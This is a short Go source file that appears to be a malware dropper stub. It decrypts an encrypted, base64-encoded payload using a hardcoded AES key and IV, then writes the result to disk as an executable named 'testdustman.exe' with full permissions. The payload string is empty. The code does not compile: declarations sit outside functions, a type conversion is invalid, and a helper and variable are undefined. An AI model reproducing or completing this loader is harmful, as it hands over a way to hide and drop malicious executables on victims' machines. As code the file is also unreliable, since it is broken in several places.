package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"io/ioutil"
)
key := []byte("7bBjcqGgs7nbgejLJpV22CLjqmUdHDdF")
iv := []byte("PXBaKTFr8HJycSUc")
payloadEncrypted := []string("")
func decrypt(key []byte, iv []byte, payloadEncrypted string) string {
	ciphertext, _ := base64.URLEncoding.DecodeString(payloadEncrypted)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	if len(ciphertext) < aes.BlockSize {
		panic("ciphertext too short")
	}
	ciphertext = ciphertext[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)

	stream.XORKeyStream(ciphertext, ciphertext)

	return fmt.Sprintf("%s", ciphertext)
}

func main() {
	payloadDecrypted := decrypt(key, iv, payloadEncrypted)

	decodedPayload, _ := base64.StdEncoding.DecodeString(payloadDecrypted)
	ioutil.WriteFile("./testdustman.exe", decodedPayload, 0777)
	check(err)

}